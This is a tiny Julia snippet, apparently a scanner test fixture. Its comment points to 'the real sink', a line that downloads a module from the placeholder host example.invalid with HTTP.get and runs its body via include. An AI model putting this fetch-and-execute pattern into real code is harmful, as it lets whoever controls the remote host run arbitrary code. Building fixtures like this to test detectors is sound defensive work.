#=
   Block comment talks about Meta.parse(src) and eval all over the place,
   but the real sink is on the line after the block comment closes.
=#
using HTTP
resp = HTTP.get("https://example.invalid/mod.jl")
include(HTTP.get("https://example.invalid/mod.jl").body)
